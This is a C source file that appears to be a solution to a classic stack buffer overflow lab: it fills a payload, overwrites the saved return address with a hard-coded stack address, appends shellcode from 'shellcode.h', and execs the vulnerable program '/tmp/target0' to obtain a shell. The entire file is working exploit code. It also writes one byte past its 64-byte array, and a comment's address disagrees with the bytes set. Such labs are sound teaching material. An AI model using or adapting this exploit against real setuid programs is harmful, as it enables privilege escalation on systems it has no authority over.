#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target0"


char payload[64];

int main(void){
  // should be of format shell code, followed by return address which points to buffer address

  for(int i=0; i<64; i++){
	payload[i] = i+1;
  }
  // to stop the copy process 
  payload[64] = 0;
  

  // found out by looking at memory layout that saved eip is 0x 18 17 16 15
  // and therefore these bytes need to be changed
  // but this is in hex, 15_hex = 21_decimal

 // putting address here 0xbffffe34 -- return address in the same accessible stack
  payload[20] = 0x24;
  payload[21] = 0xfe;
  payload[22] = 0xff;
  payload[23] = 0xbf;

  // eip will jump to this address, and whatever is present at that address, should be changed to shell code
  // this address happens to be the next one, that's why do at 24
  strcpy(payload+24, shellcode);

  char *args[] = { TARGET, payload, NULL };
  char *env[] = { NULL };

  if (execve(TARGET, args, env) == -1)
     fprintf(stderr, "execve failed.\n");

  return 0;
}


